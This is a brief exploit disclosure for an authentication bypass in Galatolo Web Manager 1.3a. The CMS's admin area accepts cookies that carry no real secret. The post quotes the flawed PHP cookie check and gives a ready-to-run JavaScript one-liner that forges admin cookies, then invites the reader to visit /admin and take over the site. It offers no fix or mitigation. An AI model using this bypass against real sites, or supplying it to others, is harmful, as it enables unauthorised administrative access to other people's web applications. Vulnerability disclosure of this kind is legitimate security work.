Galatolo Web Manager 1.3a Insecure Cookie Handling Vulnerability
================================================================



-------
DESCRIPTION:
Galatolo Web Manager, suffers from insecure cookie handling, when a admin login is successfull the script creates
a cookie to show the rest of the admin area the user is already logged in. the bad thing is the cookie doesnt
contain any password or anything alike, therefor we can craft a admin cookie and make it look like we are
logged in as a legit admin.
---
vuln code in /Admin/index.php:

if (grado($HTTP_COOKIE_VARS["gwm_user"],$HTTP_COOKIE_VARS["gwm_pass"]) == "admin" || grado($HTTP_COOKIE_VARS["gwm_user"],$HTTP_COOKIE_VARS["gwm_pass"]) == "editor" ){
top();
menu();
echo $wellcome_admin;
foot();
}

---
exploit:
javascript:document.cookie = "gwm_user=admin; path=/"; document.cookie = "gwm_pass=admin; path=/";
-----
now visit /admin and  you can get admin access and manage the cms ;)
